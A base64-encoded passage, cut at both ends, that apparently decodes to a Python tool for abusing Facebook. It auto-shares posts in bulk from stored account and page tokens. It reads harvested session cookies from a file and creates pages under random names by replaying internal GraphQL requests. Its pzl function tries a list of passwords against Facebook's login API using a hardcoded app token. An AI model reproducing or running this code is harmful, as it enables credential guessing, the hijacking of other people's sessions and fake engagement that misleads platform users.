zE7MzdtQ0hPT1NFIFRZUEUgT0YgQUNDT1VOVFMgVE8gQVVUTyBTSEFSRTogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzMxbVswXSBcMDMzWzE7MzFtRVhJVCAKICAgIFwwMzNbMTszNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgY2hvaWNlID0gaW5wdXQoZiIgICAgIHtibHVlfUNob2ljZSAiKQogICAgCiAgICBmaWxlX21hcCA9IHsKICAgICAgICAnMSc6ICcvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQnLAogICAgICAgICcyJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnLAogICAgICAgICczJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsCiAgICAgICAgJzQnOiAnL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JwogICAgfQoKICAgIGZpbGVfcGF0aCA9IGZpbGVfbWFwLmdldChjaG9pY2UpCiAgICBpZiBub3QgZmlsZV9wYXRoOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcG9zdF9pZCA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IElEIHRvIHNoYXJlOiAiKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBudW1fc2hhcmVzID0gaW50KGlucHV0KGYiICAge2dyZWVufWhvdyBtYW55IHNoYXJlID8gOiAiKSkKCiAgICAjIENvbnN0cnVjdCB0aGUgbGluayB1c2luZyB0aGUgcG9zdCBJRAogICAgbGluayA9IGYiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3twb3N0X2lkfSIKCiAgICBzaGFyZV9pbl90aHJlYWRzKGxpbmssIGZpbGVfcGF0aCwgbnVtX3NoYXJlcykKZGVmIG1haW4yKCk6IAogICAgZnJhYWNjb3VudHNfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQnCiAgICBmcmFwYWdlc19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnCiAgICBycHdhY2NvdW50cyA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQnCiAgICBycHdwYWdlcyA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwogICAgdG90YWxfYWNjb3VudHMsIHRvdGFsX3BhZ2VzID0gY291bnRfdG9rZW5zKGZyYWFjY291bnRzX2ZpbGUsIGZyYXBhZ2VzX2ZpbGUpCiAgICB0b3RhbF9hY2NvdW50X3JwdywgdG90YWxfcGFnZXNfcnB3ID0gY291bnRfdG9rZW5zKHJwd2FjY291bnRzLHJwd3BhZ2VzKQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgICAgICAgICAgICAgIHt5ZWxsb3d9T1ZFUlZJRVcgT0YgU1RPUkVEIEFDQ09VTlQgJiBQQUdFU/CfkqsKICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAge2JsdWV9RlJBIEFDQ09VTlR7eWVsbG93fSA6IHtncmVlbn17dG90YWxfYWNjb3VudHN9CiAgICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICBwcmludChmIiAgICAge2JsdWV9WzFdIHt5ZWxsb3d9RVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7Ymx1ZX1bMl0ge3llbGxvd31BVVRPIFNIQVJFICIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYnICAgIHt5ZWxsb3d9RW50ZXIgQ2hvaWNlOiAnKQogICAgaWYgY2hvaWNlID09ICcxJzogCiAgICAgICAgZXh0cmFjdGlvbigpCiAgICBpZiBjaG9pY2UgPT0gJzInOiAKICAgICAgICBzaGFyZSgpCgoKCmRlZiBleHRyYWN0aW9uKCk6CgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiICAgICB7d2hpdGV9WzFdIHt5ZWxsb3d9RVhUUkFDVCB7cmVkfUFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMl0ge3llbGxvd31FWFRSQUNUIHtyZWR9UEFHRVMiKQogICAgcHJpbnQoIiAgICAgXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgY2hvaWNlID0gaW5wdXQoZiIgICAgIHtncmVlbn1DSE9JQ0U6ICIpLnN0cmlwKCkgCiAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgIGF4bDEoKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGF4bDIoKQogICAgZWxzZToKICAgICAgICBwcmludChmIiAgICAge3JlZH1JTlZBTElEIENIT0lDRSIpCiAgICBkZWYgcmVnKHNlbGYsIG5hbWUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnd3d3LmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICd2aS1WTix2aTtxPTAuOSxmci1GUjtxPTAuOCxmcjtxPTAuNyxlbi1VUztxPTAuNixlbjtxPTAuNScsCiAgICAgICAgICAgICdjb29raWUnOiBzZWxmLmNvb2tpZXMsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3BhZ2VzL2NyZWF0aW9uP3JlZl90eXBlPWxhdW5jaF9wb2ludCcsCiAgICAgICAgICAgICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnZGFyaycsCiAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIkdvb2dsZSBDaHJvbWUiO3Y9IjEwNyIsICJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIldpbmRvd3MiJywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLAogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA3LjAuMC4wIFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnOTc5JywKICAgICAgICAgICAgJ3gtZmItZnJpZW5kbHktbmFtZSc6ICdBZGRpdGlvbmFsUHJvZmlsZVBsdXNDcmVhdGlvbk11dGF0aW9uJywKICAgICAgICAgICAgJ3gtZmItbHNkJzogJ1pNN0ZBazZjdVJjVXAzaW13cXZIVFknLAogICAgICAgIH0KCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2F2Jzogc2VsZi5pZF9hY2MsCiAgICAgICAgICAgICdfX3VzZXInOiBzZWxmLmlkX2FjYywKICAgICAgICAgICAgJ19fYSc6ICcxJywKICAgICAgICAgICAgJ19fZHluJzogJzdBekh4cTFteHUxc3lVYkZ1QzBCVlU5OG53Z1UyOXpFZEVjOGNvNVMzTzJTN28xMVVlOGh3NnZ3Yi1xN29jODF4b3N3SXd1bzg4NkMxMXhtZno4MXNiem9hRW54TzBCbzdPMmwyVXR3d3dpODMxd2lFandad2xvNXFmSzZFN2U1OGp3R3pFOEZVNWU3b3FCd0pLMlc1b2x3dUVqVWxEdy13VXdzOW92VWFVM3F4V20yU3EyLWF6bzJOd2tRMHo4Yzg0SzJlM3UzNjItMkIwb29ibycsCiAgICAgICAgICAgICdfX2Nzcic6ICdnUDRaQU4yZC1oYmJSbUxPYmtaTzhMdlJjWFdWdnRoOWQ5R0dYS1NpTENxcXI5cUV6R1RvekFYaUNneUJoYkhyUkc4VmtRbThHRkFmeTk0Yko3eGV1Zno4aks4eUdWVkVneC03b2l3eHlwcUN3Z0Y4OHJ6S1Y4eTJPNG9jVWFrNFVwRHh1M3gxSzRvcEFVcndHeDYzSjBMdy13YTkwZUcxOHdrRTd5MTR3NGh3NkJ3Mi1vMDY5VzAwQ1NFMFBXMDZhVTAyWjN3alU2aTBidHczVEUxd0U1dScsCiAgICAgICAgICAgICdfX3JlcSc6ICd0JywKICAgICAgICAgICAgJ19faHMnOiAnMTkyOTYuSFlQOmNvbWV0X3BrZy4yLjEuMC4yLjEnLAogICAgICAgICAgICAnZHByJzogJzEnLAogICAgICAgICAgICAnX19jY2cnOiAnRVhDRUxMRU5UJywKICAgICAgICAgICAgJ19fcmV2JzogJzEwMDY0OTY0NzYnLAogICAgICAgICAgICAnX19zJzogJzFnYXBhYjp5NHh2M2Y6MmhiNG9zJywKICAgICAgICAgICAgJ19faHNpJzogJzcxNjA1NzMwMzcwOTY0OTI2ODknLAogICAgICAgICAgICAnX19jb21ldF9yZXEnOiAnMTUnLAogICAgICAgICAgICAnZmJfZHRzZyc6IHNlbGYuZmJfZHRzZywKICAgICAgICAgICAgJ2phem9lc3QnOiAnMjU0MDQnLAogICAgICAgICAgICAnbHNkJzogJ1pNN0ZBazZjdVJjVXAzaW13cXZIVFknLAogICAgICAgICAgICAnX19hYWlkJzogJzgwMDQ0NDM0NDU0NTM3NycsCiAgICAgICAgICAgICdfX3NwaW5fcic6ICcxMDA2NDk2NDc2JywKICAgICAgICAgICAgJ19fc3Bpbl9iJzogJ3RydW5rJywKICAgICAgICAgICAgJ19fc3Bpbl90JzogJzE2NjcyMDA4MjknLAogICAgICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdSZWxheU1vZGVybicsCiAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnQWRkaXRpb25hbFByb2ZpbGVQbHVzQ3JlYXRpb25NdXRhdGlvbicsCiAgICAgICAgICAgICd2YXJpYWJsZXMnOiAneyJpbnB1dCI6eyJiaW8iOiIiLCJjYXRlZ29yaWVzIjpbIjE4MTQ3NTU3NTIyMTA5NyJdLCJjcmVhdGlvbl9zb3VyY2UiOiJjb21ldCIsIm5hbWUiOiInICsgbmFtZSArICciLCJwYWdlX3JlZmVycmVyIjoibGF1bmNoX3BvaW50IiwiYWN0b3JfaWQiOiInICsgc2VsZi5pZF9hY2MgKyAnIiwiY2xpZW50X211dGF0aW9uX2lkIjoiMSJ9fScsCiAgICAgICAgICAgICdzZXJ2ZXJfdGltZXN0YW1wcyc6ICd0cnVlJywKICAgICAgICAgICAgJ2RvY19pZCc6ICc1OTAzMjIzOTA5NjkwODI1JywKICAgICAgICB9CgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2FwaS9ncmFwaHFsLycsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICBpZiAnaWQnIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgIHBhZ2VfaWQgPSByZXN1bHRbJ2lkJ10KICAgICAgICAgICAgICAgIHNlbGYuc2V0X3Byb2ZpbGVfcGljdHVyZShwYWdlX2lkKQogICAgICAgICAgICByZXR1cm4gcmVzdWx0CiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKICAgIGRlZiBzZXRfcHJvZmlsZV9waWN0dXJlKHNlbGYsIHBhZ2VfaWQpOgogICAgICAgIHBpY3R1cmVfcGF0aCA9ICIvaG9tZS9zcGFkZS9EZXNrdG9wL2xvYWQgZGF0YS9Qcm9maWxlLmpwZWciICAjIFJlcGxhY2Ugd2l0aCB5b3VyIGFjdHVhbCBwYXRoIHRvIHRoZSBwcm9maWxlIHBpY3R1cmUKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ3d3dy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogICAgICAgICAgICAnY29va2llJzogc2VsZi5jb29raWVzLAogICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdyZWZlcmVyJzogZidodHRwczovL3d3dy5mYWNlYm9vay5jb20ve3BhZ2VfaWR9JywKICAgICAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdkYXJrJywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciR29vZ2xlIENocm9tZSI7dj0iMTA3IiwgIkNocm9taXVtIjt2PSIxMDciLCAiTm90PUE/QnJhbmQiO3Y9IjI0IicsCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAgICd2aWV3cG9ydC13aWR0aCc6ICc5NzknLAogICAgICAgICAgICAneC1mYi1mcmllbmRseS1uYW1lJzogJ1Byb2ZpbGVQaWNVcGxvYWQnLAogICAgICAgICAgICAneC1mYi1sc2QnOiAnWk03RkFrNmN1UmNVcDNpbXdxdkhUWScsCiAgICAgICAgfQoKICAgICAgICBmaWxlcyA9IHsKICAgICAgICAgICAgJ3NvdXJjZSc6IChvcy5wYXRoLmJhc2VuYW1lKHBpY3R1cmVfcGF0aCksIG9wZW4ocGljdHVyZV9wYXRoLCAncmInKSwgJ2ltYWdlL2pwZWcnKQogICAgICAgIH0KCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2F2Jzogc2VsZi5pZF9hY2MsCiAgICAgICAgICAgICdfX3VzZXInOiBzZWxmLmlkX2FjYywKICAgICAgICAgICAgJ3Byb2ZpbGVfaWQnOiBwYWdlX2lkLAogICAgICAgICAgICAnZmJfZHRzZyc6IHNlbGYuZmJfZHRzZywKICAgICAgICAgICAgJ3Bob3RvX3NvdXJjZSc6ICc0JywKICAgICAgICAgICAgJ2NvbXBvc2VyX2VudHJ5X3RpbWUnOiAnMCcsCiAgICAgICAgICAgICdjb21wb3Nlcl9zZXNzaW9uX2lkJzogJ2FiYycsCiAgICAgICAgICAgICdyZWYnOiAndGltZWxpbmUnLAogICAgICAgICAgICAndXBsb2FkX2lkJzogJ3Byb2ZpbGVfcGljJywKICAgICAgICAgICAgJ3VwbG9hZF90eXBlJzogJ3Byb2ZpbGUnLAogICAgICAgIH0KCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG9zL3VwbG9hZCcsIGhlYWRlcnM9aGVhZGVycywgZmlsZXM9ZmlsZXMsIGRhdGE9ZGF0YSkKCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKIyBGdW5jdGlvbiB0byBwcmludCBjb2xvcmVkIHRleHQKZGVmIGtvbG9yKHRleHQsIGNvbG9yKToKICAgIGlmIGNvbG9yID09ICdncmVlbic6CiAgICAgICAgcHJpbnQoRm9yZS5HUkVFTiArIHRleHQgKyBTdHlsZS5SRVNFVF9BTEwpCiAgICBlbGlmIGNvbG9yID09ICdyZWQnOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgdGV4dCArIFN0eWxlLlJFU0VUX0FMTCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQodGV4dCkKCmRlZiBnZXRfY29va2llc19maWxlX3BhdGgoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICByZXR1cm4gaW5wdXQoIkVudGVyIHRoZSBwYXRoIHRvIHRoZSBjb29raWVzLnR4dCBmaWxlOiAiKQoKZGVmIGhhY2tlenIoKToKICAgIAogICAgY29va2llc19maWxlID0gZ2V0X2Nvb2tpZXNfZmlsZV9wYXRoKCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGNvb2tpZXNfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICBjb29raWVzX2xpc3QgPSBmLnJlYWRsaW5lcygpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAga29sb3IoIkVycm9yOiBGaWxlIG5vdCBmb3VuZC4gUGxlYXNlIGNoZWNrIHRoZSBwYXRoLiIsICdyZWQnKQogICAgICAgIHJldHVybgoKICAgIGZvciBjb29raWVfbGluZSBpbiBjb29raWVzX2xpc3Q6CiAgICAgICAgY29va2llX2xpbmUgPSBjb29raWVfbGluZS5zdHJpcCgpICAjIFJlbW92ZSBsZWFkaW5nL3RyYWlsaW5nIHdoaXRlc3BhY2UKCiAgICAgICAgIyBGb3IgeW91ciBwcm92aWRlZCBmb3JtYXQsIG5vIG5lZWQgdG8gc3BsaXQgZnVydGhlcjsganVzdCB1c2UgdGhlIGVudGlyZSBsaW5lIGFzIGNvb2tpZXMKICAgICAgICBjb29raWVzID0gY29va2llX2xpbmUKCiAgICAgICAgdmlldG5hbWVzZV9uYW1lcyA9IFsKICAgICAgICAgICAiTXJzVGV4YXNVTklWRVJTRSBEci5NZWVuYWtzaGlSYXZpIiwKIk1lbGFuaWkiLAoiSXNyYXQgSmFoYW4iLAoiTWQgUnViZWwgS2FoYW4iLAoiTWFyaXlhIEFrdGhyIFNhdGhpIiwKIklzcmF0IFhhaGFuIEVzaGEiLAoiWW91bmlldGhhIFdhc2lsYWgiLAoiTnVzYWliYSBJc2xhbSBFdmEiLAoiTHggWm95YSIsCiJUYXNuaWEgUmFobWFuIiwKIk1laGVkaSBIYXNhbiIsCiJSb2phIElzbGFtIiwKIkVzbWUgSm9obnN0b24iLAoiUml5YSBKYWhhbiIsCiJTaW50aGl5YSBDaG93ZGh1cnkiLAoiSmFubmF0dWwgRmVyZG9zIiwKIkF5c2hhIEphbm5hdCIsCiJNb2ludWwgSXNsYW0gU2hhbnRvIiwKIlRhbnZlZXIgUmFobWFuIiwKIlJvc2FiZWwgTWVyY2FkbyBPYWluZyIsCiJCbmVnYWxpIEJhc2kiLAoiQXNobGllIEFsbGFpc2EiLAoiUmFwayBNaWFoIiwKIlNhaW1hIEFrdGVyIiwKIk1kIE1pbmFyIiwKIlRhaG1pbmEgSmFubmF0IE1pbSIsCiJIdW1hcnlyYSBCaW4gQWxsYmloaSIsCiJTYWRpeWEgQWt0ZXIiLAoiTUQgTmFlZW0iLAoiRm95c29sIEtoYW4iLAoiTWQgUm9iaXVsIFNoZWlraCIsCiJNZCBTb2hlbCIsCiJBbGV4IEhlbHMgQWZyaWR5IiwKIk9jZW5hIE1hbnVzIiwKIlNob2hhZyBTaGVpa2giLAoiR29qbyBTYXR1cm8iLAoiU2hhZGRhdCBLaGFuIiwKIk1EIE1pdGh1biIsCiJSYWtpYiBBaG1tZWQgRm95c2FsIiwKIk1kIE9saXVsbCBTaGVpa2giLAoiTWQgU2FiYmlyIFNoYWlrZSIsCiJTayBUdXNoYXIiLAoiVmFnbmUgRGV2IiwKIk1CIO+/vW3vv71tIiwKIkxpbW9uIFNlaGsgTGltb24gU2VoayIsCiJNZCBNaWxhbiIsCiJSZXlhZCBJc2xhbSIsCiJNZCBTaG9idXpwcmEiLAoiTWQgTWFzdW0gSXNsYW0iLAoiVGFuemltIFJhYmJ5IiwKIlLvv71iaW4gSGVyZSIsCiJNRCBTdW1vbiBNRCBTdW1vbiIsCiJBc2lmIEtoYW4iLAoiTWlzIEFmaWEiLAoi77+977+977+9be+/vWwgSO+/vXHvv73vv70iLAoiTWQgU2hha2liIE1yaWRoYSIsCiJVcnp6YWwgTWlhIiwKIlNhbXVlbCBSYW1pcmV6IiwKIlNoYWRkYXQgS2hhbiIsCiJTaGFoZWVuIEthbmFpcHVyIiwKIk1EIFNhbG1hbiBTYWsiLAoiTUQgQW1pcm9sIiwKIk1haGVkaSBJc2xhbSIsCiJNRCBBbGhhc3NhbiBIYXdsZGVyIiwKIkFuaXMgT3NpbSIsCiJSYWloYW4gSXNsYW0iLAoiSGFtaWRhIEZvcmlkIFB1ciIsCiJNRCBTb2hlbCBTaGVpa2giLAoiTWQgRW1yYW0iLAoiTWQgTmlqYW0gVWRkaW4gU2hlaWtoIiwKIk1EIEJpcGxvYiIsCiJNZCBNb3lhenplbSIsCiJNZCBBemFkIiwKIkJBIERIIE9OIiwKIk1kIFJlemF1bCBSZXphdWwiLAoiVGFuamluIE1vbGxhIiwKIk1kIFN1bW9uIiwKIk9iYWlkdWwgS3JpbSIsCiJSYWJieSBLaGFuIiwKIkphaGFuZ2lyIEdhemkiLAoiTWQuIFRhbWltIiwKIk5hamlyIFNoZWlraCIsCiJBYnUgQmFrYXIgS2hhbiIsCiJNZCBBbGFtaW4iLAoiU2d1c2ggUnN1aGUiLAoiUmFiYnkgU2hlaWtoIiwKICAgICAgICBdCgogICAgICAgIHJhbmRvbV9uYW1lID0gcmFuZG9tLmNob2ljZSh2aWV0bmFtZXNlX25hbWVzKQoKICAgICAgICByZWdfaW5zdGFuY2UgPSBSZWdQcm81KGNvb2tpZXMpCiAgICAgICAgcmVzdWx0ID0gcmVnX2luc3RhbmNlLnJlZyhyYW5kb21fbmFtZSkKCiAgICAgICAgaWYgJ2Vycm9yJyBub3QgaW4gcmVzdWx0OgogICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAga29sb3IoZiIgICAgIHtncmVlbn1bU1VDQ0VTU10ge3JlZH1DcmVhdGVkIFBhZ2UiLCAnZ3JlZW4nKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICBrb2xvcihmIiAgICAge3JlZH1bVU5TVUNDRVNTRlVMXSB7Z3JlZW59Q3JlYXRlZCBQYWdlIiwgJ3JlZCcpCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgb3MKCmNsYXNzIENvbG9yOgogICAgRU5EID0gJ1wwMzNbMG0nCiAgICBCT0xEID0gJ1wwMzNbMW0nCiAgICBSRUQgPSAnXDAzM1s5MW0nCiAgICBHUkVFTiA9ICdcMDMzWzkybScKICAgIFlFTExPVyA9ICdcMDMzWzkzbScKICAgIEJMVUUgPSAnXDAzM1s5NG0nCiAgICBDWUFOID0gJ1wwMzNbOTZtJwoKZGVmIHB6bCh1c2VybmFtZSwgcGFzc3dvcmRzKToKICAgICMgRGVmaW5lIHRoZSBuZXcgYWNjZXNzIHRva2VuIGFuZCBBUEkgZGV0YWlscwogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJyAgIyBFeGFtcGxlIHRva2VuCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIGZvciBwYXNzd29yZCBpbiBwYXNzd29yZHM6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgICAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdjb20uZmFjZWJvb2suYWNjb3VudC5sb2dpbi5wcm90b2NvbC5GYjRhQXV0aEhhbmRsZXInLAogICAgICAgICAgICAnYXBpX2tleSc6ICc2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICdlbWFpbCc6IHVzZXJuYW1lLAogICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG